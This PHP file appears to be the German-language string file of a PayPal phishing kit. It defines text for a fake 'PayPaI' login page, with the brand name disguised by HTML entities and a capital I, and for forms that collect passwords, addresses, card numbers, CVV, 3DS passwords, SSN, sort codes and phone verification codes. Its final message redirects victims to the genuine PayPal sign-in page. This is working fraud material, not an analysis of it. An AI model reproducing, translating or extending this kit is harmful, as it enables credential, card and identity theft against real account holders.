<?php 
//LOG
$log_ttl1="&#80;&#97;y&#80;&#97;I Kontoaktualisierung";
$log_ttl2="Sichern";
$log_lab1="&#80;&#97;y&#80;&#97;I Seite Sicheres";
$log_lab2="Anmeldung zu Ihrem Benutzerkonto";
$log_em="E-Mail-Adresse";
$log_ps="Passwort";
$log_frg="E-Mail-Adresse oder Passwort vergessen ?";
$log_btn="Einloggen";
//FTR
$ftr_01="Die Achtung der Privatsphäre";
$ftr_02="Impressum";
$ftr_03="In Kontakt Treten";
$ftr_04="Hilfe";
//INF
$inf_scr="Ihre Sicherheit ist unser oberstes Gebot";
$inf_ttspan="Kontoinformationen aktualisieren";
$inf_lab1="Aktualisierung Ihre Rechnungsadresse";
$inf_corr="Bitte geben Sie Ihre Rechnungsadresse korrekt.";
$inf_frnm="Ihr Vorname";
$inf_lsnm="Ihr Nachname";
$inf_dob="Date Of Geburtstag TT/MM/JJJJ";
$inf_add="Adresszeile";
$inf_cty="Stadt";
$inf_stt="Staat/Provinz";
$inf_cnt="Land";
$inf_zip="Postleitzahl";
$inf_mob="Handy";
$inf_hom="Privat";
$inf_pho="Telefonnummer";
$inf_con="Fortsetzen";
//CRD
$crd_ttspan="Karteninformationen aktualisieren";
$crd_lab1="Aktualisieren Sie Ihre Kredit-/Bankkarte";
$crd_corr="Bitte geben Sie Ihre Kredit-/Bankkarte Informationen korrekt.";
$crd_crdh="Kartenhalter";
$crd_crdn="Geben Sie Ihre Kartennummer";
$crd_expd="Verfallsdatum MM/JJ";
$crd_cv="CSC / CVV";
$crd_ttcv="Sicherheitscode einfügen Karte auf Ihrer Karte";
$crd_ptcv="./scr/csc";
$crd_wtcv="Was ist der CSC-Code ?";
$crd_ttptcv="Kartenprüfcode - Hilfe";
$crd_cvp="CVV (oder Kartenprüfwert) ist ein Anti-Betrugs-Sicherheitsmerkmal, das prüft, ob die Kreditkarte in Ihrem Besitz ist. Für Visa / Mastercard ist die dreistellige CVV-Nummer auf dem Unterschriftsfeld auf der Rückseite der Karte nach der Kontonummer aufgedruckt. Bei American Express wird die vierstellige CVV-Nummer auf der Vorderseite der Karte über der Kontonummer gedruckt.";
$crd_cvtd1="Es gibt eine Anzahl von 3 Ziffern kursiv invertiert die Rückseite der Kreditkarte.";
$crd_cvtd2="Es ist eine 4-stellige Zahl auf der Vorderseite der Autos, knapp über der Kreditkartennummer.";
$crd_cvfrm="Schließen";
$crd_pcptcv="../../lyl_ims/cv.png";
$crd_3ds="3DS VBV/MSC Passwort";
$crd_acc="Kontonummer";
$crd_sn="SSN";
$crd_ttsn="Sozialversicherungsnummer";
$crd_srt="Sort code";
$crd_ttptsrt="Sort code - Help";
$crd_ptsrt="./scr/srt/";
$crd_pcsrt="../../lyl_ims/srt.png";
$crd_btn="Fortsetzen";
//PIN
$bnk_ttspan="Kontoüberprüfung Prozess";
$bnk_lab1="Kontoüberprüfung Prozess.";
$bnk_yrbn="Bestätigung per Telefon:";
$bnk_corr="Bitte authentifizieren Sie sich, indem Sie den Bestätigungscode eingeben, denn Sie auf Ihrem Telefon erhalten haben, und dann auf 'Jetzt bestätigen' klicken.";
$bnk_rt="Geben Sie hier den Bestätigungscode ein";
$inc_pin="Sie haben den falschen Bestätigungscode eingegeben. Bitte versuchen Sie es erneut.";
$bnk_bt="Jetzt bestätigen";
//SCS
$scs_ttspan="Erfolgreiche Aktualisierung";
$scs_lnk="https://www.paypal.com/signin/intent?country.x=DE&locale.x=de_DE";
$scs_tnk="Danke";
$scs_yrp="Ihr PayPaI Konto wurde erfolgreich aktualisiert worden.";
$scs_yhv="Sie müssen sich erneut anmelden, um die Änderungen zu speichern, werden Sie automatisch umgeleitet zur Login-Seite in 3 Sekunden ... werden Danke fuer die Benutzung unserer Systemüberprüfung.";
?>